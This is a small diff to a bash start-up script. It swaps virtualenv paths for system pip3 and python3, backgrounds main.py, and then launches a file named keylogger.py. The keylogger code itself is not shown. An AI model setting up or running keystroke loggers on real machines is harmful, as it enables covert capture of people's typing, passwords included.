@@ -1,5 +1,5 @@
 #!/bin/bash
-bin/pip install -r requirements.txt
-bin/python3.8 main.py r
-bin/python3.8 keylogger.py
+pip3 install -r requirements.txt
+python3 main.py r &
+python3 keylogger.py
 
